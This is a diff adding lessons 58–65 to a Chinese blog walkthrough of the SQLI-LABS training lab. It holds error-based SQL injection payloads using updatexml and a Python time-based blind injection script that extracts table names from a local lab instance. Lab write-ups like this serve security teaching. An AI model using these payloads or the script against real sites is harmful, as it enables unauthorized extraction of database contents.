@@ -400,7 +400,94 @@ For fun, with every reset, the challenge spawns random table name, column name, 
 <pre><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-55"><a href="#Lesson-55" class="headerlink" title="Lesson 55"></a>Lesson 55</h2><p>跟上一题基本相同，不同的地方在于注入的次数不大于14次，并且变成了 ) 闭合。<br>普通的联合注入，GET 传值，单括号闭合。<br>payload:</p>
 <pre><code>?id=-1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-56"><a href="#Lesson-56" class="headerlink" title="Lesson 56"></a>Lesson 56</h2><p>跟上题相同，不同的地方在于变成了 ‘) 闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
 <pre><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-57"><a href="#Lesson-57" class="headerlink" title="Lesson 57"></a>Lesson 57</h2><p>跟上题相同，不同的地方在于变成了双引号闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
-<pre><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-58"><a href="#Lesson-58" class="headerlink" title="Lesson 58"></a>Lesson 58</h2>
+<pre><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-58"><a href="#Lesson-58" class="headerlink" title="Lesson 58"></a>Lesson 58</h2><p>注入次数限制变成了5次。GET 传值，单引号闭合。报错注入。<br>payload:</p>
+<pre><code>?id=&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><h2 id="Lesson-59"><a href="#Lesson-59" class="headerlink" title="Lesson 59"></a>Lesson 59</h2><p>跟上题相同。GET 传值，无闭合，报错注入。<br>payload:</p>
+<pre><code>?id=&#39;&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><h2 id="Lesson-60"><a href="#Lesson-60" class="headerlink" title="Lesson 60"></a>Lesson 60</h2><p>跟上题相同。GET 传值，”) 闭合，报错注入。<br>payload:</p>
+<pre><code>?id=&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><h2 id="Lesson-61"><a href="#Lesson-61" class="headerlink" title="Lesson 61"></a>Lesson 61</h2><p>跟上题相同。GET 传值，’)) 闭合，报错注入。<br>payload:</p>
+<pre><code>?id=&#39;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><h2 id="Lesson-62"><a href="#Lesson-62" class="headerlink" title="Lesson 62"></a>Lesson 62</h2><p>注入次数限制为 130 次以下。采用时间盲注。GET 传值，’) 闭合。<br>payload:</p>
+<pre><code># -*- coding:utf-8 -*-
+import sys
+import time
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+    # 系统表中数据
+    info_database_name = &quot;information_schema&quot;
+    info_table_name = &quot;tables&quot;  # schemata / tables / columns
+    info_column_name = &quot;table_name&quot;  # schema_name / table_name / column_name
+
+    # 注入表中数据
+    database_name = &quot;security&quot;
+    table_name = &quot;users&quot;
+    column_name = [&quot;id&quot;, &quot;username&quot;, &quot;password&quot;]
+
+    # 连接select
+    where_str = &quot; where table_schema=database()&quot;
+    # where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot;+&quot; and table_name=&#39;&quot;+table_name+&quot;&#39;&quot;
+    select_str = &quot;select &quot; + info_column_name + &quot; from &quot; + info_database_name + &quot;.&quot; + info_table_name + where_str + &quot; limit &quot; + str(
+        result_index) + &quot;,1&quot;
+    # select_str = &quot;select concat_ws(&#39;-&#39;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot;
+
+    # 连接payload
+    sqli_str = &quot;if(ascii(mid((&quot; + select_str + &quot;),&quot; + str(char_index) + &quot;,1))=&quot; + str(ascii) + &quot;,sleep(0.2),0)&quot;
+    payload = &quot;?id=1 \&#39;)&quot; + &quot; and &quot; + sqli_str + &quot;%23&quot;
+    return payload
+
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-62/index.php&quot;
+    payload = getPayload(result_index, char_index, ascii)
+    # print(payload)
+    # 检查延时
+    before_time = time.time()
+    url = url + payload
+    response = requests.get(url)
+    print(response.text)
+    after_time = time.time()
+    use_time = after_time - before_time
+    if use_time &gt; 0.1:
+        return True
+    else:
+        return False
+
+
+def exhaustive(result_index, char_index):
+    # ascii可显字符从32到126共95个 按可能性顺序
+    ascii_list = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;,
+                  &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;,
+                  &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39; &#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;,
+                  &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;:&#39;,
+                  &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;]
+    for ascii_char in ascii_list:
+        ascii = ord(ascii_char)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            return ascii_char
+    return chr(1)
+
+
+if __name__ == &quot;__main__&quot;:
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(32):  # 单条查询结果的长度
+            count += 1
+            char = exhaustive(num, len)
+            if ord(char) == 1:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write(&quot;\r\n&quot;)
+        sys.stdout.flush()
+</code></pre><p>时间盲注只能使用 python 脚本进行。因为时间盲注所使用次数必定大于130，使用 python 脚本可以在短时间内进行多次访问，不至于 redirect 使得数据库表名等信息被刷新。</p>
+<p>报错注入不可行。 </p>
+<h2 id="Lesson-63"><a href="#Lesson-63" class="headerlink" title="Lesson 63"></a>Lesson 63</h2><p>跟上一题相同，唯一不同之处在使用的是单引号闭合，GET 传值，时间盲注。payload 和上一题基本相同，不在挂上来了。</p>
+<h2 id="Lesson-64"><a href="#Lesson-64" class="headerlink" title="Lesson 64"></a>Lesson 64</h2><p>跟上一题相同，唯一不同之处在使用的是 )) 闭合，GET 传值，时间盲注。payload 和 Lesson 62 基本相同。</p>
+<h2 id="Lesson-65"><a href="#Lesson-65" class="headerlink" title="Lesson 65"></a>Lesson 65</h2><p>跟上一题相同，唯一不同之处在使用的是单括号闭合，GET 传值，时间盲注。payload 和 Lesson 62 基本相同。</p>
+<p>结束。</p>
+
                             <hr>
                         </div>
                         <br>
